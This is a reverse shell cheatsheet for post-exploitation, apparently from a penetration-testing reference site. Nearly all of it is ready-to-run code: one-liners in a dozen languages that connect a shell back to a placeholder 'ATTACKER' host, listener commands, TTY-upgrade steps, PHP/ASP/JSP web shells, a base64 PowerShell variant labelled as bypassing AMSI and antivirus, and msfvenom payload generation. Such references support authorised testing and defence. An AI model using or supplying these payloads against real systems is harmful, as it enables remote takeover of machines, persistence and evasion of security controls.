---
id: "reverse-shells-cheatsheet"
title: "Reverse Shell Cheatsheet - Every Language & Method"
type: "cheatsheet"
category: "post-exploitation"
subcategory: "persistence"
tags: ["reverse-shell", "cheatsheet", "bash", "python", "powershell", "netcat", "php", "quick-reference"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
related: ["command-injection-payloads", "linux-privesc", "windows-privesc"]
updated: "2026-03-30"
---

## Listener Setup

```bash
# Netcat listener
nc -lvnp 4444
rlwrap nc -lvnp 4444  # With readline (arrow keys work)

# Socat encrypted listener
socat -d -d OPENSSL-LISTEN:4444,cert=cert.pem,verify=0,fork STDOUT

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ATTACKER; set LPORT 4444; exploit"

# pwncat (auto-upgrade to interactive)
pwncat-cs -lp 4444
```

## Bash

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/ATTACKER/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
```

## PHP

```php
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

## Perl

```perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat

```bash
nc -e /bin/sh ATTACKER 4444
nc -e cmd.exe ATTACKER 4444

# Without -e flag (OpenBSD netcat)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Ncat (encrypted)
ncat --ssl ATTACKER 4444 -e /bin/sh
```

## PowerShell

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"

# Base64-encoded (bypass AMSI/AV)
powershell -enc BASE64_ENCODED_PAYLOAD

# Powercat
powercat -c ATTACKER -p 4444 -e cmd
```

## Socat

```bash
socat TCP:ATTACKER:4444 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
socat TCP:ATTACKER:4444 EXEC:'cmd.exe',pipes

# Encrypted
socat OPENSSL:ATTACKER:4444,verify=0 EXEC:/bin/sh
```

## Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'");
```

## Node.js

```javascript
require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1')

// Alternative
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"ATTACKER",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

## Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## Upgrading Shells

```bash
# Step 1: Spawn a TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null

# Step 2: Background the shell
Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg
# or
stty raw -echo && fg

# Step 4: Set terminal type and size
export TERM=xterm-256color
stty rows 38 cols 116
```

## Web Shells (One-Liners)

```php
# PHP
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

# ASP
<% eval request("cmd") %>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Payload Generators

```bash
# msfvenom Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell

# msfvenom Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# msfvenom PHP
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > shell.php

# msfvenom WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war
```
